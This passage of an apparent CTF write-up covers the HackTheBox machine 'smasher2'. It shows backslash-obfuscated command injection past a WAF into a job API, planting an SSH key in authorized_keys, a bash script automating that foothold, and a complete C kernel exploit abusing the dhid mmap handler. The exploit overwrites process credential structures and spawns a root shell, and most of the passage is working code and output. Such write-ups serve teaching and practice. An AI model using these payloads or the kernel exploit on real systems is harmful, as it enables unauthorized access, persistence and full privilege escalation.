drwxrwxr-x 4 dzonerzy dzonerzy 4096 Feb 16 15:14 smanager
-rw-r----- 1 root     dzonerzy   33 Feb 17 23:24 user.txt

```

I can get it now:

```

root@kali# curl -s --data '{"schedule":"c\\at /home/dzonerzy/user.txt"}' -H "Cookie: session=eyJpZCI6eyIgYiI6IllUVTVZbVptTjJOa1l6ZzNNVEUyWm1Vd016YzFPRFJoTWpobVkyTTJZbUUxWmpKbU5tRXpNZz09In19.XRd2ZQ.-hB4ig0S1CyfDTgRmuhV4CdKP4c" -H "Content-Type: application/json" http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job | jq -r '.result'
91a13e31************************

```

### SSH Key Poisoning

I was not able to get anything like my IP address through the WAF, so I chanced tactics. I am already in dzonerzy’s homedir. I’ll create a `.ssh` directory, and upload a key.

Create the directory:

```

root@kali# curl -s --data '{"schedule":"mk\\dir /home/dzonerzy/.ss\\h"}' -H "Cookie: session=eyJpZCI6eyIgYiI6Ik1XTmpZVEJsWldKaU1EQTROakEzTldWaFpqSTBZakpsTm1JMU5qSXdaVGRtWTJFMVpEUXlNdz09In19.XRfV3w.yIrue2DcpN4NAJwYDMUOAohsbSU" -H "Content-Type: application/json" http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job
{"result":"","success":true}

```

`base64` the key and write it to `/tmp`:

```

root@kali# base64 -w0 ~/id_rsa_generated.pub 
c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFDMFN3cHdaN3JnTXRDWll6a0R0Rkp2UVpPMjBOKzhEbVl4T2l4K1BnTDZWUVcvOXdaQzN4bktLMXplQWVsTVl0di9PMzhHWEUyZ2hVSDd6NmF5Vm1UTWtqR3F0MThtaHNFcEN0MEJib25HUkMwSUhvQnNWNVFCVk5pbit4MXNvVmRFQ1QxVHI0NWJOblRua1pYSWdTeUR1bWMrMkl4NkExd2lpQzVSYkkzU3J4SjduTDBsUmxoamRvQUg2S0NiNGR3aFgrSm9zMFZ1ZEhScmVFMDErMFlFMFFiN1NkMGVBNUNxN1V0amdpVzZWeVhjbVdIN2FRZFZabFVhbnJzNXdkd1dZZVZDeFkvWGZGQ0NEbUhadys4VzVJTnVkTTJ0N29uN2JsL3JZbmhBRXhPcjE0LzFzN0xmWUFmVjhCNlZOUFBYK0lPek9jVDRhWVFDM3JSRGlHNVAgcm9vdEBrYWxpCg==

root@kali# curl -s --data '{"schedule":"echo \"c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFDMFN3cHdaN3JnTXRDWll6a0R0Rkp2UVpPMjBOKzhEbVl4T2l4K1BnTDZWUVcvOXdaQzN4bktLMXplQWVsTVl0di9PMzhHWEUyZ2hVSDd6NmF5Vm1UTWtqR3F0MThtaHNFcEN0MEJib25HUkMwSUhvQnNWNVFCVk5pbit4MXNvVmRFQ1QxVHI0NWJOblRua1pYSWdTeUR1bWMrMkl4NkExd2lpQzVSYkkzU3J4SjduTDBsUmxoamRvQUg2S0NiNGR3aFgrSm9zMFZ1ZEhScmVFMDErMFlFMFFiN1NkMGVBNUNxN1V0amdpVzZWeVhjbVdIN2FRZFZabFVhbnJzNXdkd1dZZVZDeFkvWGZGQ0NEbUhadys4VzVJTnVkTTJ0N29uN2JsL3JZbmhBRXhPcjE0LzFzN0xmWUFmVjhCNlZOUFBYK0lPek9jVDRhWVFDM3JSRGlHNVAgcm9vdEBrYWxpCg==\" > /tmp/df"}' -H "Cookie: session=eyJpZCI6eyIgYiI6Ik1XTmpZVEJsWldKaU1EQTROakEzTldWaFpqSTBZakpsTm1JMU5qSXdaVGRtWTJFMVpEUXlNdz09In19.XRfV3w.yIrue2DcpN4NAJwYDMUOAohsbSU" -H "Content-Type: application/json" http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job
{"result":"","success":true}

```

Now decode the key and store in `authorized_keys`:

```

root@kali# curl -s --data '{"schedule":"ba\\se\\64 -\\d /tmp/df >> /home/dzonerzy/.ss\\h/autho\\rized_k\\eys"}' -H "Cookie: session=eyJpZCI6eyIgYiI6Ik1XTmpZVEJsWldKaU1EQTROakEzTldWaFpqSTBZakpsTm1JMU5qSXdaVGRtWTJFMVpEUXlNdz09In19.XRfV3w.yIrue2DcpN4NAJwYDMUOAohsbSU" -H "Content-Type: application/json" http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job
{"result":"","success":true}

```

Now I can connect:

```

root@kali# ssh -i ~/id_rsa_generated dzonerzy@10.10.10.135
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-45-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
 * 'snap info' now shows the freshness of each channel.
   Try 'snap info microk8s' for all the latest goodness.

Last login: Fri Feb 15 22:05:15 2019
dzonerzy@smasher2:~$

```

### Script It

This `bash` script will automate the basic steps to get a shell:

```

#!/bin/bash

cookie=$(curl -s -I  http://wonderfulsessionmanager.smasher2.htb/ | grep "Set-Cookie" | cut -d';' -f1 | cut -d= -f2)
ssh_pub_b64=$(cat ~/id_rsa_generated.pub | base64 -w0)

# Upload base64 encoded key
curl -s -H "Cookie: session=$cookie" -H "Content-Type: application/json" http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data '{"schedule":"echo    \"'$ssh_pub_b64'\" > /tmp/df"}' | grep -q true || { echo "[-] Failed to upload public key to /tmp"; exit 1; }
echo "[+] Uploaded base64-encoded public key to /tmp/df"

# make .ssh directory
curl -s -H "Cookie: session=$cookie" -H "Content-Type: application/json" http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data '{"schedule":         "mk\\dir -\\p /home/dzonerzy/.ss\\h"}' | grep -q true || { echo "[-] Failed to make /home/dzonerzy/.ssh directory";  exit 1; }
echo "[+] Created .ssh directory"

# Decode Key
curl -s -H "Cookie: session=$cookie" -H "Content-Type: application/json" http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data '{"schedule":"base64 -\\d /tmp/df > /home/dzonerzy/.ss\\h/auth\\orized_keys"}' | grep -q true || { echo "[-] Failed to decode key into authorized_keys"; exit 1; }
echo "[+] Decoded public key into authorized_keys file"

# Delete tmp file
curl -s -H "Cookie: session=$cookie" -H "Content-Type: application/json" http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data '{"schedule":"rm /tmp/df"}' | grep -q true || echo "[-] Failed to delete encoded key from tmp. Manually rm /tmp/df"

echo -e "[+] SSH with the following command:\nssh -i ~/id_rsa_generated dzonerzy@10.10.10.135"

```

```

root@kali# ./smasher_shell.sh
[+] Uploaded base64-encoded public key to /tmp/df
[+] Created .ssh directory
[+] Decoded public key into authorized_keys file
[+] SSH with the following command:
ssh -i ~/id_rsa_generated dzonerzy@10.10.10.135
root@kali# ssh -i ~/id_rsa_generated dzonerzy@10.10.10.135
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-45-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings                                                                                                     

Last login: Sat Jun 29 23:36:53 2019 from 10.10.14.8
dzonerzy@smasher2:~$

```

## Priv: dzonerzy –> root

### Enumeration

I’ll notice right away that dzonerzy is in the `adm` group (always check your groups!):

```

dzonerzy@smasher2:/$ id
uid=1000(dzonerzy) gid=1000(dzonerzy) groups=1000(dzonerzy),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)

```

That gives me access to the following files:

```

dzonerzy@smasher2:/$ find / -group adm 2>/dev/null
/var/spool/rsyslog
/var/log/apt/term.log
/var/log/syslog
/var/log/apache2
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/apache2/other_vhosts_access.log
/var/log/kern.log
/var/log/auth.log

```

With access to `auth.log`, I can look at different commands that were run with `sudo`. The log lines take the format of:

```

dzonerzy@smasher2:/$ strings /var/log/auth.log | grep COMMAND | head -1
Feb 15 21:58:48 smasher sudo: dzonerzy : TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/usr/bin/apt-get update

```

With a bit of bash-foo I can get a unique list of the commands in this log:

```

dzonerzy@smasher2:/$ strings /var/log/auth.log | grep COMMAND | cut -d: -f5- | sort -u
 command not allowed ; TTY=pts/0 ; PWD=/dev/shm ; USER=root ; COMMAND=list
 TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/bin/chown root:root banner
 TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/bin/su
 TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/bin/systemctl enable rc.local.service
 TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/usr/bin/apt-get update
 TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/usr/bin/apt-get upgrade
 TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/usr/bin/apt install apache2 python-pip
 TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/usr/bin/id
 TTY=unknown ; PWD=/ ; USER=dzonerzy ; COMMAND=/bin/bash -c cd /home/dzonerzy/smanager && ./runner.py 2>&1 > /dev/null &
 TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/sbin/insmod /lib/modules/4.15.0-45-generic/kernel/drivers/hid/dhid.ko

```

All but the last two seem to be setting up the box. The second to last one starts the webserver running as dzonerzy. The last one is interesting.

If I run strings on the binary, I get this:

```

dzonerzy@smasher2:/$ strings /lib/modules/4.15.0-45-generic/kernel/drivers/hid/dhid.ko
...[snip]...
This is the right way, please exploit this shit!
...[snip]...
version=1.0
description=LKM for dzonerzy dhid devices
author=DZONERZY
license=GPL
...[snip]...

```

I can see the device in `/dev`:

```

dzonerzy@smasher2:/$ ls /dev/dhid -l
crwxrwxrwx 1 root root 243, 0 Jul  3 09:14 /dev/dhid

```

### Background

[This paper](https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-mmap-exploitation-whitepaper-2017-09-18.pdf) from F-Secure does a really great job of breaking down what an mmap handler is, and how to find issues in it. In section 4 (on page 15), it goes into how to exploit them. It gives an example, which I’ll try to apply here and see how far I can get. The idea is that I will use the mmap handler to look through memory to find a credential structure (`struct cred`), which is defined [here](https://elixir.bootlin.com/linux/latest/source/include/linux/cred.h):

```

struct cred {
	atomic_t	usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
	atomic_t	subscribers;	/* number of processes subscribed */
	void		*put_addr;
	unsigned	magic;
#define CRED_MAGIC	0x43736564
#define CRED_MAGIC_DEAD	0x44656144
#endif
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
	kernel_cap_t	cap_ambient;	/* Ambient capability set */
#ifdef CONFIG_KEYS
	unsigned char	jit_keyring;	/* default keyring to attach requested
					 * keys to */
	struct key	*session_keyring; /* keyring inherited over fork */
	struct key	*process_keyring; /* keyring private to this process */
	struct key	*thread_keyring; /* keyring private to this thread */
	struct key	*request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
	void		*security;	/* subjective LSM security */
#endif
	struct user_struct *user;	/* real user ID subscription */
	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
	struct group_info *group_info;	/* supplementary groups for euid/fsgid */
	/* RCU deletion */
	union {
		int non_rcu;			/* Can we skip RCU deletion? */
		struct rcu_head	rcu;		/* RCU deletion hook */
	};
} __randomize_layout;

```

Of note, I see 8 continuous integer size variables which are defined by the current user (`uid`, `guid`, `suid`, etc), then four bytes of `securebits`, and then four or five (depending on the kernel) long ints that are the capabilities.

So the strategy will be:
1. Open memory using the mmap handler.
2. Know what our current uid is.
3. Scan memory for something that matches a credential structure for the current user.
4. Replace the uids/guids with 0.
5. Call `getuid()` and see if we are now root.
6. If yes, replace the capabilities with -1 and then spawn a new `sh` process as root, and break the loop. If not, set the uids/guids back to their original values.

### Exploitation

I’ll follow the steps from the article above to build a script. This code can be intimidating. I knew nothing about this when I started here and came across this paper on Google. But if you work through the code step by step, it is pretty clear what it’s doing.

#### Open mmap

The first thing I’ll do is try to open the mmap device. I’ll grab the code from the article (with minor mods for this case and style):

```

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/mman.h>
#include <unistd.h>

int main(int argc, char* const* argv)
{
    printf("[+] PID: %d\n", getpid());
    int fd = open("/dev/dhid", O_RDWR);
    if (fd < 0)
    {
        printf("[-] Open failed!\n");
        return-1;
    }
    printf("[+] Open OK fd: %d\n", fd);

    unsigned long size = 0xf0000000;
    unsigned long mmapStart = 0x42424000;
    unsigned int * addr = (unsigned int *)mmap((void*)mmapStart, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0);
    if (addr == MAP_FAILED)
    {
        perror("Failed to mmap: ");
        close(fd);
        return-1;
    }

    printf("[+] mmap OK addr: %lx\n", addr);
    int stop = getchar();
    return 0;
}

```

Now I’ll compile, and run:

```

dzonerzy@smasher2:/dev/shm$ gcc exp1.c -o exp1
exp1.c: In function ‘main’:
exp1.c:30:33: warning: format ‘%lx’ expects argument of type ‘long unsigned int’, but argument 2 has type ‘unsigned int *’ [-Wformat=]
     printf("[+] mmap OK addr: %lx\n", addr);
                               ~~^
                               %ls
dzonerzy@smasher2:/dev/shm$ ./exp1 
[+] PID: 16373
[+] Open OK fd: 3
[+] mmap OK addr: 42424000

```

So it was able to open the mmap handler. Good start. And it hangs at `getchar()` as intended. I can SSH in in another terminal and look at the memory maps for this process (while it’s still alive and waiting), and see in the top line that `dhid` has a map to the address I requested:

```

dzonerzy@smasher2:~$ cat /proc/16389/maps
42424000-132424000 rw-s 00000000 00:06 440                               /dev/dhid
562e03956000-562e03957000 r-xp 00000000 00:19 4                          /dev/shm/exp1
562e03b56000-562e03b57000 r--p 00000000 00:19 4                          /dev/shm/exp1
562e03b57000-562e03b58000 rw-p 00001000 00:19 4                          /dev/shm/exp1
562e044ac000-562e044cd000 rw-p 00000000 00:00 0                          [heap]
7f2350edc000-7f23510c3000 r-xp 00000000 08:01 263261                     /lib/x86_64-linux-gnu/libc-2.27.so
7f23510c3000-7f23512c3000 ---p 001e7000 08:01 263261                     /lib/x86_64-linux-gnu/libc-2.27.so
7f23512c3000-7f23512c7000 r--p 001e7000 08:01 263261                     /lib/x86_64-linux-gnu/libc-2.27.so
7f23512c7000-7f23512c9000 rw-p 001eb000 08:01 263261                     /lib/x86_64-linux-gnu/libc-2.27.so
7f23512c9000-7f23512cd000 rw-p 00000000 00:00 0 
7f23512cd000-7f23512f4000 r-xp 00000000 08:01 263255                     /lib/x86_64-linux-gnu/ld-2.27.so
7f23514ec000-7f23514ee000 rw-p 00000000 00:00 0 
7f23514f4000-7f23514f5000 r--p 00027000 08:01 263255                     /lib/x86_64-linux-gnu/ld-2.27.so
7f23514f5000-7f23514f6000 rw-p 00028000 08:01 263255                     /lib/x86_64-linux-gnu/ld-2.27.so
7f23514f6000-7f23514f7000 rw-p 00000000 00:00 0 
7ffdbff0e000-7ffdbff2f000 rw-p 00000000 00:00 0                          [stack]
7ffdbff97000-7ffdbff9a000 r--p 00000000 00:00 0                          [vvar]
7ffdbff9a000-7ffdbff9c000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]

```

With a root shell (which I will have shortly), I can look at all of memory. I called `mmap` with an offset of 0 and a size of `0xf0000000` bytes. That means I now have access to that space. I’ll mark a line where I can access everything above:

```

root@smasher2:/dev/shm# cat /proc/iomem
00000000-00000fff : Reserved
00001000-0009ebff : System RAM
0009ec00-0009ffff : Reserved
000a0000-000bffff : PCI Bus 0000:00
000c0000-000c7fff : Video ROM
000ca000-000cafff : Adapter ROM
000cc000-000cffff : PCI Bus 0000:00
000d0000-000d3fff : PCI Bus 0000:00
000d4000-000d7fff : PCI Bus 0000:00
000d8000-000dbfff : PCI Bus 0000:00
000dc000-000fffff : Reserved
  000f0000-000fffff : System ROM
00100000-7fedffff : System RAM
  77a00000-786031d0 : Kernel code
  786031d1-7906a3ff : Kernel data
  792e2000-7953dfff : Kernel bss
7fee0000-7fefefff : ACPI Tables
7feff000-7fefffff : ACPI Non-volatile Storage
7ff00000-7fffffff : System RAM
c0000000-febfffff : PCI Bus 0000:00
...[snip]...
--------------I've mapped everything above this--------------
  f0000000-f7ffffff : PCI MMCONFIG 0000 [bus 00-7f]
    f0000000-f7ffffff : Reserved
      f0000000-f7ffffff : pnp 00:05
  fb500000-fb5fffff : PCI Bus 0000:22
  fb600000-fb6fffff : PCI Bus 0000:1a
  fb700000-fb7fffff : PCI Bus 0000:12
...[snip]...

```

I could go larger and map all of memory, but it’s not necessary.

#### Find Credential Structs

Now I’ll update the code above to look for the credential object in memory by getting the current uid, and then adding a loop to look for that int eight times in a row:

```

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/mman.h>
#include <unistd.h>

int main(int argc, char* const* argv)
{
    printf("[+] PID: %d\n", getpid());
    int fd = open("/dev/dhid", O_RDWR);
    if (fd < 0)
    {
        printf("[-] Open failed!\n");
        return-1;
    }
    printf("[+] Open OK fd: %d\n", fd);

    unsigned long size = 0xf0000000;
    unsigned long mmapStart = 0x42424000;
    unsigned int * addr = (unsigned int *)mmap((void*)mmapStart, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0);
    if (addr == MAP_FAILED)
    {
        perror("Failed to mmap: ");
        close(fd);
        return-1;
    }

    printf("[+] mmap OK addr: %x\n", addr);

    unsigned int uid = getuid();
    printf("[+] UID: %d\n", uid);

    unsigned int credIt = 0;
    unsigned int credNum = 0;
    while (((unsigned long)addr) < (mmapStart + size -0x40))
    {
        credIt = 0;
        if (
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid
            )
        {
            credNum++;
            printf("[+] Found cred structure! ptr: %p, credNum: %d\n", addr, credNum);
        }
        addr++;
    }
    puts("[+] Scanning loop END");
    fflush(stdout);

    int stop = getchar();
    return 0;
}

```

When I compile and run, it finds 19 potential cred structs:

```

dzonerzy@smasher2:/dev/shm$ ./exp2
[+] PID: 16512
[+] Open OK fd: 3
[+] mmap OK addr: 42424000
[+] UID: 1000
[+] Found cred structure! ptr: 0x7574e004, credNum: 1
[+] Found cred structure! ptr: 0x7574e6c4, credNum: 2
[+] Found cred structure! ptr: 0x7574ecc4, credNum: 3
[+] Found cred structure! ptr: 0x7574f744, credNum: 4
[+] Found cred structure! ptr: 0x761caa84, credNum: 5
[+] Found cred structure! ptr: 0x761cafc4, credNum: 6
[+] Found cred structure! ptr: 0x761cb144, credNum: 7
[+] Found cred structure! ptr: 0x761cb984, credNum: 8
[+] Found cred structure! ptr: 0x761cbe04, credNum: 9
[+] Found cred structure! ptr: 0x764203c4, credNum: 10
[+] Found cred structure! ptr: 0x764206c4, credNum: 11
[+] Found cred structure! ptr: 0x76420a84, credNum: 12
[+] Found cred structure! ptr: 0x76420fc4, credNum: 13
[+] Found cred structure! ptr: 0x76421204, credNum: 14
[+] Found cred structure! ptr: 0x764218c4, credNum: 15
[+] Found cred structure! ptr: 0x76c52fc4, credNum: 16
[+] Found cred structure! ptr: 0x76c53684, credNum: 17
[+] Found cred structure! ptr: 0x76c538c4, credNum: 18
[+] Found cred structure! ptr: 0xb58f7984, credNum: 19
[+] Scanning loop END

```

#### Find Current Process Cred

Now I’ll update the code so that for each potential cred struct, I’ll change it to user and group id 0 for root, and then try to run `getuid()`. If that returns 0 (for root), I’ll know I’ve modified the credential struct for my current process.

I’ll update the code as follows:

```

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/mman.h>
#include <unistd.h>

int main(int argc, char* const* argv)
{
    printf("[+] PID: %d\n", getpid());
    int fd = open("/dev/dhid", O_RDWR);
    if (fd < 0)
    {
        printf("[-] Open failed!\n");
        return-1;
    }
    printf("[+] Open OK fd: %d\n", fd);

    unsigned long size = 0xf0000000;
    unsigned long mmapStart = 0x42424000;
    unsigned int * addr = (unsigned int *)mmap((void*)mmapStart, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0);
    if (addr == MAP_FAILED)
    {
        perror("Failed to mmap: ");
        close(fd);
        return-1;
    }

    printf("[+] mmap OK addr: %x\n", addr);

    unsigned int uid = getuid();
    printf("[+] UID: %d\n", uid);

    unsigned int credIt = 0;
    unsigned int credNum = 0;
    while (((unsigned long)addr) < (mmapStart + size -0x40))
    {
        credIt = 0;
        if (
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid
            )
        {
            credNum++;
            printf("[+] Found cred structure! ptr: %p, credNum: %d\n", addr, credNum);

            credIt = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;

            if (getuid() == 0)
            {
                puts("[+] GOT ROOT!");
                break;
            }
            else
            {
                credIt = 0;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
            }

        }
        addr++;
    }
    puts("[+] Scanning loop END");
    fflush(stdout);

    int stop = getchar();
    return 0;
}

```

Now I can compile and run, and I get root, which means it worked:

```

dzonerzy@smasher2:/dev/shm$ ./exp3 
[+] PID: 16534
[+] Open OK fd: 3
[+] mmap OK addr: 42424000
[+] UID: 1000
[+] Found cred structure! ptr: 0x7574e004, credNum: 1
[+] Found cred structure! ptr: 0x7574f744, credNum: 2
[+] Found cred structure! ptr: 0x761caa84, credNum: 3
[+] Found cred structure! ptr: 0x761cafc4, credNum: 4
[+] Found cred structure! ptr: 0x761cb144, credNum: 5
[+] Found cred structure! ptr: 0x761cb984, credNum: 6
[+] Found cred structure! ptr: 0x761cbe04, credNum: 7
[+] Found cred structure! ptr: 0x764203c4, credNum: 8
[+] Found cred structure! ptr: 0x76420604, credNum: 9
[+] GOT ROOT!
[+] Scanning loop END

```

While it’s waiting for `getchar()`, I can check out the status of the process and see it’s running as root:

```

dzonerzy@smasher2:/dev/shm$ cat /proc/16540/status
Name:   exp3
Umask:  0002
State:  S (sleeping)
Tgid:   16540
Ngid:   0
Pid:    16540
PPid:   993
TracerPid:      0
Uid:    0       0       0       0   <-- root
Gid:    0       0       0       0   <-- root group
FDSize: 256
Groups: 4 24 30 46 111 112 1000
...[snip]...
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000 
...[snip]...

```

#### Shell

Now I’ll upgrade this to get a shell. I just need to add in code that will set the capabilities to all 1s, and then `execl` a shell:

```

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/mman.h>
#include <unistd.h>

int main(int argc, char* const* argv)
{
    printf("[+] PID: %d\n", getpid());
    int fd = open("/dev/dhid", O_RDWR);
    if (fd < 0)
    {
        printf("[-] Open failed!\n");
        return-1;
    }
    printf("[+] Open OK fd: %d\n", fd);

    unsigned long size = 0xf0000000;
    unsigned long mmapStart = 0x42424000;
    unsigned int * addr = (unsigned int *)mmap((void*)mmapStart, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0);
    if (addr == MAP_FAILED)
    {
        perror("Failed to mmap: ");
        close(fd);
        return-1;
    }

    printf("[+] mmap OK addr: %x\n", addr);

    unsigned int uid = getuid();
    printf("[+] UID: %d\n", uid);

    unsigned int credIt = 0;
    unsigned int credNum = 0;
    while (((unsigned long)addr) < (mmapStart + size -0x40))
    {
        credIt = 0;
        if (
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid
            )
        {
            credNum++;
            printf("[+] Found cred structure! ptr: %p, credNum: %d\n", addr, credNum);

            credIt = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;

            if (getuid() == 0)
            {
                puts("[+] GOT ROOT!");

                credIt += 1; //skip 4 bytes to get to caps
                addr[credIt++] = 0xffffffff;
                addr[credIt++] = 0xffffffff;
                addr[credIt++] = 0xffffffff;
                addr[credIt++] = 0xffffffff;
                addr[credIt++] = 0xffffffff;
                addr[credIt++] = 0xffffffff;
                addr[credIt++] = 0xffffffff;
                addr[credIt++] = 0xffffffff;

                execl("/bin/sh", "-", (char *)NULL);
                break;
            }
            else
            {
                credIt = 0;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
            }

        }
        addr++;
    }
    puts("[+] Scanning loop END");
    fflush(stdout);

    int stop = getchar();
    return 0;
}

```

Now compile as before and then run:

```

dzonerzy@smasher2:/dev/shm$ ./exp4
[+] PID: 16749
[+] Open OK fd: 3
[+] mmap OK addr: 42424000
[+] UID: 1000
[+] Found cred structure! ptr: 0x7574e004, credNum: 1
[+] Found cred structure! ptr: 0x7574f744, credNum: 2
[+] Found cred structure! ptr: 0x761caa84, credNum: 3
[+] Found cred structure! ptr: 0x761cafc4, credNum: 4
[+] Found cred structure! ptr: 0x761cb144, credNum: 5
[+] Found cred structure! ptr: 0x761cb984, credNum: 6
[+] Found cred structure! ptr: 0x761cbe04, credNum: 7
[+] Found cred structure! ptr: 0x764203c4, credNum: 8
[+] Found cred structure! ptr: 0x764206c4, credNum: 9
[+] Found cred structure! ptr: 0x76420a84, credNum: 10
[+] Found cred structure! ptr: 0x76420fc4, credNum: 11
[+] Found cred structure! ptr: 0x76421204, credNum: 12
[+] Found cred structure! ptr: 0x764218c4, credNum: 13
[+] Found cred structure! ptr: 0x76c52fc4, credNum: 14
[+] Found cred structure! ptr: 0x76c53684, credNum: 15
[+] Found cred structure! ptr: 0x76c538c4, credNum: 16
[+] Found cred structure! ptr: 0x77070484, credNum: 17
[+] GOT ROOT!
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare),1000(dzonerzy)

```

From there I can grab `root.txt`:

```

# cat /root/root.txt
7791e0e1************************

```